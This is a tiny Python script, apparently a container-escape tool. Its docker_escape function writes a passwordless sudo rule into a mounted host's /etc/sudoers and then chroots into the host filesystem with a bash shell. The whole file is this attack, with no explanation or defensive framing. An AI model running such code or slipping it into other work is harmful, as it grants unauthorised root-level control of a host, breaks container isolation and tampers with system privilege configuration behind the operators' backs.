import os

def docker_escape():
    # Attempt to access the host filesystem
    os.system("echo 'root ALL=(ALL) NOPASSWD:ALL' >> /host/etc/sudoers")
    os.system("chroot /host /bin/bash")

if __name__ == "__main__":
    docker_escape()
